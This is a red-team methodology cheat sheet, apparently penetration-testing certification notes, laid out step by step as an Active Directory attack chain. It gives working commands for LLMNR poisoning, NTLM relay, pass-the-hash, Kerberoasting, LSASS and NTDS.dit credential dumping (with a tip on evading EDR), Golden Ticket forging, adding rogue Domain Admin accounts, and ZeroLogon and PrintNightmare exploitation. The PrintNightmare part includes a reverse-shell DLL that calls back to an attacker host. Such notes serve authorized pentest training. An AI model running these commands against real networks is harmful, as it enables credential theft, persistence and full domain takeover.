# Red Team Methodology

## Method Map

- `1` **Host Discovery**
  - `1.1` **Local-network discovery**
    - `1.1.1` **ARP**
      - `1.1.1.1` arp-scan
      - `1.1.1.2` Netdiscover
    - `1.1.2` ICMP range sweep
  - `1.2` **Routed-network discovery**
    - `1.2.1` **Nmap**
      - `1.2.1.1` TCP SYN and ACK probes
      - `1.2.1.2` UDP service probes
      - `1.2.1.3` Host-only sweep
      - `1.2.1.4` Aggressive all-port scan
      - `1.2.1.5` SYN stealth with default scripts
- `2` **Initial Attacks for Active Directory**
  - `2.1` **LLMNR Poisoning**
    - `2.1.1` Responder hash capture
    - `2.1.2` Hashcat NTLMv2 cracking
  - `2.2` **SMB Relay Attack**
    - `2.2.1` Enumerate SMB signing
    - `2.2.2` Responder relay configuration
    - `2.2.3` ntlmrelayx.py
- `3` **Gaining Shell Access**
  - `3.1` **Impacket lateral movement**
    - `3.1.1` psexec
    - `3.1.2` wmiexec
    - `3.1.3` smbexec
  - `3.2` **Metasploit psexec**
- `4` **IPv6 Attacks**
  - `4.1` mitm6 + ntlmrelayx.py
- `5` **Post-Compromise Enumeration (Active Directory)**
  - `5.1` ldapdomaindump
  - `5.2` BloodHound
  - `5.3` PlumHound
- `6` **Post-Compromise Attacks (Active Directory)**
  - `6.1` **Pass the Password / Pass-the-Hash**
    - `6.1.1` crackmapexec credential validation
    - `6.1.2` secretsdump.py
    - `6.1.3` crackmapexec modules
  - `6.2` **Kerberoasting**
    - `6.2.1` GetUserSPNs.py
    - `6.2.2` Hashcat TGS cracking
  - `6.3` **Token Impersonation**
  - `6.4` **Credential Dumping**
    - `6.4.1` Mimikatz
    - `6.4.2` LSASS dump via Task Manager
    - `6.4.3` LSASS dump via procdump
    - `6.4.4` LSASS dump via crackmapexec
  - `6.5` **User and Group Manipulation**
  - `6.6` **GPP / cPassword Attacks**
- `7` **Domain Dominance**
  - `7.1` Dumping NTDS.dit
  - `7.2` Golden Ticket
- `8` **Additional Active Directory Attacks**
  - `8.1` **ZeroLogon (CVE-2020-1472)**
  - `8.2` **PrintNightmare (CVE-2021-1675)**
    - `8.2.1` RCE — Remote Code Execution
    - `8.2.2` LPE — Local Privilege Escalation

## 1. Host Discovery

### 1.1 Local-network discovery

#### 1.1.1 ARP

##### 1.1.1.1 arp-scan <sup>· PJPT</sup>

```bash
sudo arp-scan -I <INTERFACE> --localnet
```

<details>
<summary>Details</summary>

**Description**

- Sends ARP requests to find active IPv4 hosts on the selected local Layer 2 network.
- Records IP, MAC, and vendor information for responding hosts.

**Parameters**

- `-I <INTERFACE>` — Selects the network interface to use.
- `--localnet` — Derives the target range from that interface's IP address and netmask.

</details>

##### 1.1.1.2 Netdiscover <sup>· PJPT</sup>

```bash
sudo netdiscover -i <INTERFACE> -r <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Sends ARP requests across a specified local subnet.
- Can also be used for passive ARP reconnaissance.

**Parameters**

- `-i <INTERFACE>` — Selects the interface for ARP traffic.
- `-r <IP/MASK>` — Sets the local CIDR range to scan.

</details>

#### 1.1.2 ICMP range sweep <sup>· CPTS</sup>

```bash
fping -a -g <IP/MASK> 2>/dev/null
```

<details>
<summary>Details</summary>

**Description**

- Lists addresses that answer ICMP echo requests.
- A missing reply does not prove that a host is offline.

**Parameters**

- `-a` — Shows only hosts that respond.
- `-g` — Generates addresses from the supplied CIDR range.
- `<IP/MASK>` — Target CIDR range.
- `2>/dev/null` — Suppresses error output from the shell.

</details>

### 1.2 Routed-network discovery

#### 1.2.1 Nmap

##### 1.2.1.1 TCP SYN and ACK probes <sup>· CPTS</sup>

```bash
sudo nmap -sn -PS22,80,443 -PA80,443 <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Identifies hosts that respond to selected TCP SYN or ACK probes.
- Useful when ICMP echo requests are filtered.

**Parameters**

- `-sn` — Performs host discovery without a port scan.
- `-PS22,80,443` — Sends TCP SYN probes to the listed ports.
- `-PA80,443` — Sends TCP ACK probes to the listed ports.
- `<IP/MASK>` — Target host or CIDR range.

</details>

##### 1.2.1.2 UDP service probes <sup>· CPTS</sup>

```bash
sudo nmap -sn -PU53,123,161 <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Uses UDP probes to elicit responses from common infrastructure services.
- Helps identify hosts that do not answer ICMP or TCP discovery probes.

**Parameters**

- `-sn` — Performs host discovery without a port scan.
- `-PU53,123,161` — Sends UDP probes to the listed ports.
- `<IP/MASK>` — Target host or CIDR range.

</details>

##### 1.2.1.3 Host-only sweep <sup>· CPTS</sup>

```bash
nmap -sn -n <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Performs Nmap host discovery without a port scan.
- Disables reverse DNS lookups for cleaner, faster output.

**Parameters**

- `-sn` — Performs host discovery without a port scan.
- `-n` — Disables reverse DNS resolution.
- `<IP/MASK>` — Target host or CIDR range.

</details>

##### 1.2.1.4 Aggressive all-port scan <sup>· PJPT</sup>

```bash
nmap -T4 -p- -A <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Scans all 65535 TCP ports with aggressive timing and full-featured detection.
- Performs OS detection, version detection, script scanning, and traceroute.

**Parameters**

- `-T4` — Aggressive timing template for faster scanning.
- `-p-` — Scans all TCP ports (1–65535).
- `-A` — Enables OS detection, version detection, script scanning, and traceroute.
- `<IP/MASK>` — Target host or CIDR range.

</details>

##### 1.2.1.5 SYN stealth with default scripts <sup>· PJPT</sup>

```bash
nmap -T4 -p- -sS -sC <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Performs a TCP SYN stealth scan across all ports and runs default NSE scripts.
- Combines fast timing with service discovery and basic vulnerability enumeration.

**Parameters**

- `-T4` — Aggressive timing template.
- `-p-` — Scans all TCP ports (1–65535).
- `-sS` — TCP SYN stealth scan (half-open, default root scan type).
- `-sC` — Runs default NSE scripts against discovered services.
- `<IP/MASK>` — Target host or CIDR range.

</details>

## 2. Initial Attacks for Active Directory

### 2.1 LLMNR Poisoning

#### 2.1.1 Responder hash capture <sup>· PJPT</sup>

```bash
sudo responder -I <INTERFACE> -dP
```

<details>
<summary>Details</summary>

**Description**

- Captures NTLMv2 hashes by poisoning LLMNR, NBT-NS, and MDNS name resolution requests.
- Listens on the specified interface and responds to name queries, directing victims to the attacker's machine.

**Parameters**

- `-I <INTERFACE>` — Network interface to listen on (e.g. tun0).
- `-d` — Doesn't answer to NetBIOS domain suffix queries (DWITH option).
- `-P` — Doesn't answer to Proxy Auth requests.

</details>

#### 2.1.2 Hashcat NTLMv2 cracking <sup>· PJPT</sup>

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

<details>
<summary>Details</summary>

**Description**

- Cracks captured NTLMv2 hashes offline using a wordlist.
- After capturing a hash with Responder, copy it to a file and run hashcat against it.

**Parameters**

- `-m 5600` — Hash type for NetNTLMv2.
- `hash.txt` — File containing the captured hash.
- `/usr/share/wordlists/rockyou.txt` — Wordlist for dictionary attack.

</details>

### 2.2 SMB Relay Attack

#### 2.2.1 Enumerate SMB signing <sup>· PJPT</sup>

```bash
nmap -p445 <IP/MASK> --script=smb2-security-mode
```

<details>
<summary>Details</summary>

**Description**

- Checks whether SMB message signing is required on discovered hosts.
- The SMB relay attack works only when SMB signing is disabled.

**Parameters**

- `-p445` — Scans only the SMB port.
- `--script=smb2-security-mode` — Runs the NSE script that reports SMB signing requirements.
- `<IP/MASK>` — Target host or CIDR range.

</details>

#### 2.2.2 Responder relay configuration <sup>· PJPT</sup>

Edit the Responder configuration to disable SMB and HTTP services:

```bash
sudo nano /etc/responder/Responder.conf
```

Set the following values:

```
SMB = Off
HTTP = Off
```

Then start Responder:

```bash
sudo responder -I <INTERFACE> -dP
```

<details>
<summary>Details</summary>

**Description**

- Disables Responder's built-in SMB and HTTP servers so that traffic is handed off to the NTLM relay tool.
- Responder continues to poison name resolution requests while the relay tool handles authentication.

</details>

#### 2.2.3 ntlmrelayx.py <sup>· PJPT</sup>

**Dump password hashes:**

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

**Create an interactive SMB shell:**

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```

**Execute a command on all relayed targets:**

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

<details>
<summary>Details</summary>

**Description**

- Relays captured NTLM authentications to target systems where SMB signing is disabled.
- Can dump local SAM hashes, launch interactive SMB shells, or execute arbitrary commands.

**Parameters**

- `-tf targets.txt` — File containing target IP addresses, one per line.
- `-smb2support` — Enables SMBv2 support for the relay.
- `-i` — Opens an interactive SMB shell after a successful relay.
- `-c <COMMAND>` — Executes the given command on the relayed target.

</details>

## 3. Gaining Shell Access

### 3.1 Impacket lateral movement

#### 3.1.1 psexec <sup>· PJPT</sup>

**For domain users:**

```bash
psexec.py <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

**For local users:**

```bash
psexec.py <USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

**With local user and password hash:**

```bash
psexec.py Administrator@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Obtains a semi-interactive shell on a remote Windows system via the SMB protocol.
- Creates a Windows service on the target, runs commands through it, and deletes it on exit.

**Parameters**

- `<DOMAIN>/<USERNAME>` — Domain-qualified username or `./<USERNAME>` for local accounts.
- `'<PASSWORD>'` — User password (quote if it contains special characters).
- `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticates using NTLM hash instead of a password.
- `<TARGET_IP>` — IP address of the target machine.

</details>

#### 3.1.2 wmiexec <sup>· PJPT</sup>

```bash
wmiexec.py Administrator@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Provides a semi-interactive shell via Windows Management Instrumentation (WMI).
- Uses DCOM/WMI instead of SMB services, often evading detection better than psexec.

**Parameters**

- `Administrator@<TARGET_IP>` — Username and target IP.
- `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticates using NTLM hash.

</details>

#### 3.1.3 smbexec <sup>· PJPT</sup>

```bash
smbexec.py <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

<details>
<summary>Details</summary>

**Description**

- Semi-interactive shell similar to psexec but uses native Windows SMB admin shares for I/O.
- Commands are executed through batch scripts written to the ADMIN$ share.

</details>

### 3.2 Metasploit psexec <sup>· PJPT</sup>

```
use exploit/windows/smb/psexec
set SMBDomain <DOMAIN>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
set RHOSTS <TARGET_IP>
run
```

<details>
<summary>Details</summary>

**Description**

- Metasploit module that delivers a Meterpreter payload via the same SMB service-creation technique.
- Supports both local and domain authentication.

**Parameters**

- `SMBDomain` — Target domain (use `.` for local accounts).
- `SMBUser` — Username for authentication.
- `SMBPass` — Password for authentication.
- `RHOSTS` — Target IP address or range.

</details>

## 4. IPv6 Attacks

### 4.1 mitm6 + ntlmrelayx.py <sup>· PJPT</sup>

**Start mitm6 for the target domain:**

```bash
sudo mitm6 -d <DOMAIN>
```

**Start ntlmrelayx.py for LDAP relay over IPv6:**

```bash
ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.<DOMAIN> -l <LOOT_DIR>
```

<details>
<summary>Details</summary>

**Description**

- If IPv6 is enabled on the network but no DNS server for IPv6 exists, mitm6 can impersonate one.
- mitm6 spoofs DHCPv6 and DNS replies to redirect WPAD traffic to the attacker.
- ntlmrelayx.py relays captured authentication to LDAP(S), enabling domain object manipulation.
- Results are saved as HTML reports in the specified loot directory (e.g., `domain_computers.html`).

**Parameters**

- `-d <DOMAIN>` — The target Active Directory domain (e.g., `test.local`).
- `-6` — Enables IPv6 mode in ntlmrelayx.py.
- `-t ldaps://<DC_IP>` — Target domain controller over LDAPS.
- `-wh fakewpad.<DOMAIN>` — Spoofed WPAD hostname for the relay.
- `-l <LOOT_DIR>` — Directory where enumerated domain information is saved.

</details>

## 5. Post-Compromise Enumeration (Active Directory)

### 5.1 ldapdomaindump <sup>· PJPT</sup>

```bash
sudo ldapdomaindump ldaps://<DC_IP> -u '<DOMAIN>\\<USERNAME>' -p <PASSWORD>
```

After execution, open the generated HTML files:

```bash
firefox domain_*.html
```

<details>
<summary>Details</summary>

**Description**

- Dumps Active Directory information via LDAP and produces human-readable HTML reports.
- Generates files detailing domain users, groups, computers, trusts, and policies.
- Works with standard domain credentials — does not require elevated privileges.

**Parameters**

- `ldaps://<DC_IP>` — Domain controller address over LDAPS.
- `-u '<DOMAIN>\\<USERNAME>'` — Domain-qualified username.
- `-p <PASSWORD>` — User password.

</details>

### 5.2 BloodHound <sup>· PJPT</sup>

**Collect data with bloodhound-python:**

```bash
sudo bloodhound-python -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -ns <DC_IP> -c all
```

**Start the analysis platform:**

```bash
sudo neo4j console
sudo bloodhound
```

Drag and drop the generated JSON files into the BloodHound GUI.

<details>
<summary>Details</summary>

**Description**

- Maps Active Directory attack paths by collecting and analysing relationships between users, groups, computers, and permissions.
- bloodhound-python collects data remotely without touching disk on the target.

**Parameters**

- `-d <DOMAIN>` — Target AD domain.
- `-u <USERNAME>` — Username for LDAP authentication.
- `-p <PASSWORD>` — Password for LDAP authentication.
- `-ns <DC_IP>` — Domain controller IP used for name resolution.
- `-c all` — Collects all available data categories (sessions, ACLs, groups, trusts, etc.).

</details>

### 5.3 PlumHound <sup>· PJPT</sup>

```bash
sudo python3 PlumHound.py --easy -p <NEO4J_PASSWORD>
sudo python3 PlumHound.py -x tasks/default.tasks -p <NEO4J_PASSWORD>
```

<details>
<summary>Details</summary>

**Description**

- Runs on top of BloodHound's Neo4j database to automate common AD attack path analysis.
- Produces HTML reports of actionable vulnerabilities and attack paths.
- Neo4j and BloodHound must already be running before executing PlumHound.

**Parameters**

- `--easy` — Runs a simplified set of preconfigured queries.
- `-x tasks/default.tasks` — Executes a custom task file.
- `-p <NEO4J_PASSWORD>` — Password for the Neo4j database.

</details>

## 6. Post-Compromise Attacks (Active Directory)

### 6.1 Pass the Password / Pass-the-Hash

#### 6.1.1 crackmapexec credential validation <sup>· PJPT</sup>

**Validate credentials across the network via SMB:**

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD>
```

**Validate using a password hash:**

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u administrator -H <NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Tests credentials across an entire subnet over the SMB protocol.
- A `Pwn3d!` result indicates local administrator rights on that machine.
- Supports both cleartext passwords and NTLM hashes.

**Parameters**

- `smb` — Protocol to test (SMB).
- `<IP/MASK>` — Target subnet range.
- `-d <DOMAIN>` — Active Directory domain name.
- `-u <USERNAME>` — Username to test.
- `-p <PASSWORD>` — Cleartext password.
- `-H <NTLM_HASH>` — NTLM hash for Pass-the-Hash authentication.

</details>

#### 6.1.2 secretsdump.py <sup>· PJPT</sup>

**Dump local hashes with credentials:**

```bash
secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
```

**Dump local hashes with a password hash:**

```bash
secretsdump.py administrator@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Extracts SAM, LSA secrets, and cached credentials from a remote Windows machine.
- Requires local administrator privileges on the target.

**Parameters**

- `<DOMAIN>/<USERNAME>` — Domain-qualified username.
- `<PASSWORD>` — User password.
- `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticate using NTLM hash instead of password.
- `<TARGET_IP>` — IP address of the target machine.

</details>

#### 6.1.3 crackmapexec modules <sup>· PJPT</sup>

**Dump credentials with the lsassy module:**

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u administrator -H <NTLM_HASH> --local-auth -M lsassy
```

**Access the crackmapexec database:**

```bash
cmedb
```

<details>
<summary>Details</summary>

**Description**

- crackmapexec modules extend its functionality with specialised attack and enumeration capabilities.
- `lsassy` extracts credentials from LSASS memory remotely through SMB.
- `cmedb` provides access to the crackmapexec database of discovered hosts and credentials.

**Common Modules and Flags**

| Flag | Description |
|---|---|
| `--local-auth` | Authenticate locally to each target (non-domain). |
| `--sam` | Dump SAM hashes from target system. |
| `--lsa` | Dump LSA secrets from target system. |
| `--shares` | Enumerate shares and access. |
| `-M <MODULE>` | Specify the module to run (e.g. `lsassy`). |
| `-L` | List available modules for each protocol. |

</details>

### 6.2 Kerberoasting

#### 6.2.1 GetUserSPNs.py <sup>· PJPT</sup>

```bash
python GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request
```

<details>
<summary>Details</summary>

**Description**

- Requests Ticket Granting Service (TGS) tickets for accounts with Service Principal Names (SPNs).
- Any domain user can request these tickets; the encrypted portion is derived from the service account's password.
- The returned hash can be cracked offline to recover the plaintext password.

**Parameters**

- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Credentials of any domain user.
- `-dc-ip <DC_IP>` — Domain controller IP address.
- `-request` — Requests TGS tickets for discovered SPN accounts.

</details>

#### 6.2.2 Hashcat TGS cracking <sup>· PJPT</sup>

```bash
hashcat -m 13100 SPNs-hash.txt /usr/share/wordlists/rockyou.txt
```

<details>
<summary>Details</summary>

**Description**

- Cracks Kerberos TGS ticket hashes offline.
- Copy the hash output from GetUserSPNs.py into a file crackable by hashcat.

**Parameters**

- `-m 13100` — Hash type for Kerberos 5 TGS-REP (etype 23).
- `SPNs-hash.txt` — File containing the captured TGS hashes.
- `/usr/share/wordlists/rockyou.txt` — Wordlist for dictionary attack.

</details>

### 6.3 Token Impersonation <sup>· PJPT</sup>

**In a Meterpreter session, list available tokens:**

```
list_tokens -u
```

**Impersonate a user token:**

```
impersonate_token DOMAIN\\USERNAME
```

<details>
<summary>Details</summary>

**Description**

- If a Meterpreter shell is active on a system, all available tokens on that machine can be enumerated.
- You can impersonate any user whose token is present (e.g. a domain administrator who logged in previously).

**Commands**

- `list_tokens -u` — Lists all user tokens available on the compromised system.
- `impersonate_token DOMAIN\\USERNAME` — Adopts the security context of the specified user.

</details>

### 6.4 Credential Dumping

#### 6.4.1 Mimikatz <sup>· PJPT</sup>

```
privilege::debug
lsadump::lsa /patch
sekurlsa::minidump lsass.DMP
sekurlsa::logonPasswords
```

<details>
<summary>Details</summary>

**Description**

- Extracts plaintext passwords, NTLM hashes, Kerberos tickets, and PINs from LSASS memory.
- Can operate on a live system or on an offline memory dump.

**Commands**

- `privilege::debug` — Enables SeDebugPrivilege for memory access.
- `lsadump::lsa /patch` — Dumps LSA secrets from the running system.
- `sekurlsa::minidump lsass.DMP` — Loads an offline LSASS dump file into Mimikatz.
- `sekurlsa::logonPasswords` — Extracts credentials from LSASS memory.

</details>

#### 6.4.2 LSASS dump via Task Manager <sup>· PJPT</sup>

1. Open Task Manager → **Details** tab
2. Find `lsass.exe`
3. Right-click → **Create dump file** → `lsass.DMP`
4. Transfer the dump file to your Kali machine
5. Extract credentials:

```bash
pypykatz lsa minidump lsass.DMP
```

<details>
<summary>Details</summary>

**Description**

- Uses the Windows Task Manager GUI to create a memory dump of the LSASS process.
- Requires graphical access to the target (RDP, VNC, or physical access).

</details>

#### 6.4.3 LSASS dump via procdump <sup>· PJPT</sup>

```bash
procdump.exe -accepteula -ma lsass.exe out.dmp
```

Alternatively, use the process ID to evade string-based EDR detection:

```powershell
Get-Process lsass          # PowerShell
```

```cmd
tasklist | findstr lsass   # CMD
```

```bash
procdump.exe -accepteula -ma <PID> out.dmp
```

<details>
<summary>Details</summary>

**Description**

- Dumps the LSASS process memory using the Sysinternals procdump tool.
- Using the PID instead of the process name may help evade EDR solutions that monitor for `lsass.exe` strings.

**Parameters**

- `-accepteula` — Accepts the Sysinternals license agreement silently.
- `-ma` — Writes a full memory dump.
- `<PID>` — Process ID of lsass.exe.

</details>

#### 6.4.4 LSASS dump via crackmapexec <sup>· PJPT</sup>

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --lsa
```

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -M lsassy
```

<details>
<summary>Details</summary>

**Description**

- `--lsa` dumps LSA secrets and password hashes; note that captured credentials are not stored in the cmedb database.
- `-M lsassy` extracts credentials from LSASS memory and stores them.

</details>

### 6.5 User and Group Manipulation <sup>· PJPT</sup>

**Create a local user and add to the local Administrators group:**

```cmd
net user /add <USERNAME> <PASSWORD>
net localgroup Administrators <USERNAME> /add
```

**Create a domain user and add to the Domain Admins group:**

```cmd
net user /add <USERNAME> <PASSWORD> /domain
net group "Domain Admins" <USERNAME> /ADD /DOMAIN
```

<details>
<summary>Details</summary>

**Description**

- When running with sufficient privileges, creates new users and adds them to privileged groups.
- Can be used for persistence or to create alternate access accounts.
- Works against both local SAM and Active Directory domains (when executed on a domain controller or with delegated rights).

</details>

### 6.6 GPP / cPassword Attacks <sup>· PJPT</sup>

**Find cPassword in SYSVOL with Metasploit:**

```
use auxiliary/smb_enum_gpp
```

**Decrypt the cPassword:**

```bash
gpp-decrypt <CIPHERED_PASSWORD>
```

<details>
<summary>Details</summary>

**Description**

- Group Policy Preferences (GPP) historically stored passwords in XML files encrypted with a publicly known AES key.
- These XML files can often be found on the NETLOGON and SYSVOL shares of domain controllers.
- `gpp-decrypt` (installed by default on Kali) decrypts `cPassword` values found in GPP XML files.

</details>

## 7. Domain Dominance

### 7.1 Dumping NTDS.dit <sup>· PJPT</sup>

```bash
secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc-ntlm
```

<details>
<summary>Details</summary>

**Description**

- Extracts the NTDS.dit database from a domain controller, which contains NTLM hashes for every domain user.
- Requires Domain Admin or equivalent privileges.

**Parameters**

- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Domain admin credentials.
- `-just-dc-ntlm` — Dumps only NTLM hashes from the domain controller (fastest method).
- `<DC_IP>` — Domain controller IP address.

</details>

### 7.2 Golden Ticket <sup>· PJPT</sup>

**Execute in Mimikatz:**

```
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /id:500 /ptt
misc::cmd
```

**Verify access:**

```cmd
dir \\CLIENT-01\c$
```

<details>
<summary>Details</summary>

**Description**

- A Golden Ticket grants unrestricted access to any resource in the domain by forging TGTs signed with the krbtgt account hash.
- Requires the domain SID and the NTLM hash of the krbtgt account (obtained via DCSync or NTDS.dit dump).
- Persistence is retained even if all user passwords are changed, as long as the krbtgt hash remains valid.

**Commands**

- `lsadump::lsa /inject /name:krbtgt` — Extracts the krbtgt NTLM hash and domain SID.
- `kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /id:500 /ptt` — Creates and injects a Golden Ticket into the current session.
- `misc::cmd` — Opens a new command prompt with the injected ticket.

</details>

## 8. Additional Active Directory Attacks

### 8.1 ZeroLogon (CVE-2020-1472) <sup>· PJPT</sup>

> **Warning:** ZeroLogon can cause irreversible damage to the domain controller. In the worst case, the DC becomes non-functional. Always consult with the client before exploitation.

**Check if the domain controller is vulnerable:**

```bash
git clone https://github.com/SecuraBV/CVE-2020-1472.git
cd CVE-2020-1472
sudo pip3 install -r requirements.txt
python3 zerologon_tester.py <DC_NAME> <DC_IP>
```

<details>
<summary>Details</summary>

**Description**

- ZeroLogon exploits a cryptographic flaw in the Netlogon Remote Protocol (MS-NRPC).
- Allows an unauthenticated attacker on the network to set the domain controller's machine account password to an empty string, effectively taking full control.
- In practice, testing for the vulnerability is often sufficient; full exploitation should only be performed with explicit client approval.

**Parameters**

- `<DC_NAME>` — NetBIOS computer name of the domain controller (e.g., `DC-01`).
- `<DC_IP>` — IP address of the domain controller.

</details>

### 8.2 PrintNightmare (CVE-2021-1675) <sup>· PJPT</sup>

#### 8.2.1 RCE — Remote Code Execution

**Check if the target is vulnerable:**

```bash
rpcdump.py @<TARGET_IP> | egrep 'MS-RPRN|MS-PAR'
```

If the output includes `MS-PAR` and `MS-RPRN`, the target is vulnerable.

**Create a malicious DLL:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT> -f dll > shell.dll
```

**Host the DLL on an SMB share:**

```bash
smbserver.py share . -smb2support
```

**Set up the Metasploit listener:**

```
use multi/handler
set LHOST <ATTACKER_IP>
set LPORT <LPORT>
set payload windows/x64/meterpreter/reverse_tcp
run
```

**Run the exploit:**

```bash
python3 CVE-2021-1675.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> '\\<ATTACKER_IP>\share\shell.dll'
```

<details>
<summary>Details</summary>

**Description**

- Exploits the Windows Print Spooler service to load a malicious DLL from a remote SMB share.
- The Spooler service runs as SYSTEM, granting immediate privileged access.
- Requires valid domain credentials to interact with the print spooler over RPC.

</details>

#### 8.2.2 LPE — Local Privilege Escalation

```powershell
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare

# Or with custom credentials:
Invoke-Nightmare -DriverName "Xerox" -NewUser "<USERNAME>" -NewPassword "<PASSWORD>"
```

<details>
<summary>Details</summary>

**Description**

- Local privilege escalation variant of PrintNightmare that adds a new local administrator.
- By default, `Invoke-Nightmare` (with no arguments) creates a user `adm1n` with password `P@ssw0rd` in the local Administrators group.

**Parameters**

- `-DriverName` — Optional printer driver name for the exploit.
- `-NewUser` — Username for the new local admin account.
- `-NewPassword` — Password for the new local admin account.

</details>
